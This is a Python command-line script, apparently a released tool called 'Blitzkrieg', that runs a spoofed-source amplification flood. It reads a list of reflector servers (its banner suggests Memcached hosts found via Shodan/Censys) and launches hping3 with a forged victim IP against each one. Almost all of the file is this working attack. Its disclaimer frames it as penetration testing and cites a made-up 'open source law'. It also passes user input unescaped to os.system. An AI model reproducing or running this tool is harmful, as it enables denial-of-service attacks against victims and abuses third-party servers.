import os
from sys import platform
os.system("clear")
DISCLAIMER = '''

         ██████╗ ██╗     ██╗████████╗███████╗██╗  ██╗██████╗ ██╗███████╗ ██████╗ 
         ██╔══██╗██║     ██║╚══██╔══╝╚══███╔╝██║ ██╔╝██╔══██╗██║██╔════╝██╔════╝ 
         ██████╔╝██║     ██║   ██║     ███╔╝ █████╔╝ ██████╔╝██║█████╗  ██║  ███╗
         ██╔══██╗██║     ██║   ██║    ███╔╝  ██╔═██╗ ██╔══██╗██║██╔══╝  ██║   ██║
         ██████╔╝███████╗██║   ██║   ███████╗██║  ██╗██║  ██║██║███████╗╚██████╔╝
         ╚═════╝ ╚══════╝╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝ 

                                    Author: @Abikalll
                                  Version: First Release

####################################### DISCLAIMER ###########################################
#                                                                                            #
#  Blitzkrieg is a tool that utilizes the system os library in order to exploit the hping    #
#  package. By doing that the user gets the ability to modify the header of the protocol     #
#  request packet, allowing him to change the source IP written on it. Using the script      #
#  you can search for valnurable Memcached servers on the Shadan.io/Censys.io databases      #
#  eventualy sending them a large ammount of spoofed packets, tricking them into returning   #
#  the request back to the false host. The attack is much more powerful than the classic     #
#  botnet amplification flood since it uses more servers with higher bandwith. Ending, it    #
#  is important to mention that the use of all ping class utilities is protected under       #
#  the GitHub and Unix free use open source law. This is clearly a penetration testing tool, #
#  for people who want to test firewall security against this kind of attacks, so by having  #
#  that said I take no responsibility for what is the tool used for by each individual.      #
#                                                                                            #
##############################################################################################
                                                                                      
'''
logo = '''

          ██████╗ ██╗     ██╗████████╗███████╗██╗  ██╗██████╗ ██╗███████╗ ██████╗ 
          ██╔══██╗██║     ██║╚══██╔══╝╚══███╔╝██║ ██╔╝██╔══██╗██║██╔════╝██╔════╝ 
          ██████╔╝██║     ██║   ██║     ███╔╝ █████╔╝ ██████╔╝██║█████╗  ██║  ███╗
          ██╔══██╗██║     ██║   ██║    ███╔╝  ██╔═██╗ ██╔══██╗██║██╔══╝  ██║   ██║
          ██████╔╝███████╗██║   ██║   ███████╗██║  ██╗██║  ██║██║███████╗╚██████╔╝
          ╚═════╝ ╚══════╝╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝ 
                                    
                                    Author: @Abikalll
                                  Version: First Release
'''
print(DISCLAIMER)
aws = int(input("DISCLAIMER: Agree(1) | Disagree (2) >>> "))
if aws == 2:
    os.system("clear")
    quit()
os.system("clear")
print(DISCLAIMER)
if platform == "win32":
    print("Apologies, this version of the script doesn't run on Widnows")
if platform == "linux" or platform == "linux2":
    aws = str(input("Is the |hping| package installed on your machine? [Yes / No] >>> "))
    os.system("clear")
    print(logo)
if platform == "darwin":
    print("Apologies, this version of the script doesn't run on MacOS!")
while aws != "Yes" and aws != "No":
    aws = str(input("Please choose between [Yes/ No]! >>> "))
    os.system("clear")
    print(logo)
if aws == "No":
    aws = int(input("Choose your package manager [(1)Pacman | (2)APT] >>> "))
    os.system("clear")
    print(logo)
    while aws != 1 and aws != 2:
        aws = int(input("Please choose between [(1)Pacman | (2)APT] >>> "))
        os.system("clear")
        print(logo)
    if aws == 1:
        os.system("pacman -S hping")
        os.system("clear")
        print(logo)
    elif aws == 2:
        os.system("apt-get install hping")
        os.system("clear")
        print(logo)
count = 0
var = str(input("Blitzkrieg >>> Socket >>> Console >>> "))
timer = 0
serverlist = []
commandlist = []
srcip = 0
protocol = "nothing"
state = "parametring"
listofpossiblecommands = ["exec", "timer", "addser", "shost", "sprot", "fetch", "sslist"]
while var != "exit":
    if var not in listofpossiblecommands:
        print('Command not found! Try typing "help" for a list of commands.')
    if var == "fetch":
        dnsip = str(input("Enter the IP or the DNS you want to fetch info about >>> "))
        command = ("nslookup " + str(dnsip))
        os.system(command)
        command = ("traceroute " + str(dnsip))
        os.system(command)
    if var == "help":
        print('''
        exec -->   Executes the script with al the given parameters.
        timer -->  Sets a timer after wich the script will be executed (In seconds).
        addser --> Add a server in the attack list.
        shost -->  Sets the spoofed source IP.
        sprot -->  Sets the attack protocol.
        fetch -->  Fetches info on an IP or a DNS.
        sslist --> Shows server list.
        ''')
    if var == "timer":
        timer = int(input("Enter the time after wich you want the script to be executed. >>> "))
        print("Timer is set to: " + str(timer) + " seconds.")
    if var == "shost":
        srcip = str(input("Enter the spoofed source IP you want to use. >>> "))
        print("Source IP set to >>> " + str(srcip))
    if var == "cls":
        os.system("clear")
        print(logo)
    if var == "sprot":
        protocol = str(input("Enter the protocol you want to use. >>> "))
        print("Protocol is set to >>> ", protocol.upper())
    if var == "addser":
        IP = str(input("Enter the IP of the server. >>> "))
        serverlist.append(IP)
    if var == "sslist":
        print(serverlist)
    if var == "exec":
        if protocol == "nothing" or srcip == 0:
            print("Not enough parameters to execute the attack!")
        else:
            aws = str(input("Are you sure you want to execute this attack? [Yes / No] >>> "))
            if aws == "Yes":
                length = len(serverlist)
                while count != length:
                    command = ("hping3 -a " + str(srcip) + " " + str(serverlist[count]) + " --" + str(protocol) + " &")
                    commandlist.append(command)
                    count += 1
                count = 0
                while count != length:
                    os.system(commandlist[count])
                    count += 1
                state = "running"
    if state != "running":
        var = str(input("Blitzkrieg >>> Socket >>> Console >>> "))
    if state == "running":
        count = 0
        sleep = 1 / length
        command = ("sleep " + str(sleep))
        while count != -1:
            print("Sending Spoofed " + str(protocol.upper()) + " Type Packet Number [" + str(count) + "]")
            os.system(command)
            count += 1
os.system("clear")
